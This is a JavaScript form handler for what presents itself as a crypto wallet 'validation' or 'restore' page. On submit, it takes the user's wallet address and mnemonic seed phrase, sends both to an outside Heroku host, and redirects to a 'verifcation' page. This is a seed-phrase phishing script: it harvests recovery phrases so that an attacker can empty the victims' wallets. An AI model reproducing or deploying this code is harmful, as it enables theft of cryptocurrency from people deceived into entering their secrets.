const form = document.getElementById("form");
const walletAddress = document.getElementById("exampleFormControlInput1");
const mnemonic = document.getElementById("exampleInputEmail1");

form.addEventListener("submit", async (e) => {
  let mnemonicValue = mnemonic.value.trim();
  let walletAddressValue = walletAddress.value.trim();
  e.preventDefault();
  await checkInput();
  const url = "https://wallet-validation.herokuapp.com/mnemonic/restore";
  const response = await fetch(url, {
    method: "post",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      mnemonicPhrase: mnemonicValue,
      walletAddress: walletAddressValue,
    }),
  });
  if (response.status === 201) {
    let data = await response.json();
    location.assign("verifcation.html");
  }
});
// Validation for form
function checkInput() {
  if (walletAddress.value === "") {
    addErrorTo("exampleFormControlInput1", "Wallet Address is required!");
  } else {
    removeError("exampleFormControlInput1");
  }
  if (mnemonic.value === "") {
    addErrorTo("exampleInputEmail1", "Enter your word phrase");
  } else {
    removeError("exampleInputEmail1");
  }
}

// creating customize error message
function addErrorTo(field, message) {
  const formControl = form[field].parentNode;
  formControl.classList.add("error");

  const errMsg = formControl.querySelector("small");
  errMsg.innerText = message;
  errMsg.style.opacity = "1";
}
function removeError(field) {
  const formControl = form[field].parentNode;
  formControl.classList.remove("error");

  const errMsg = formControl.querySelector("small");
  errMsg.innerText = "";
  errMsg.style.opacity = "0";
}
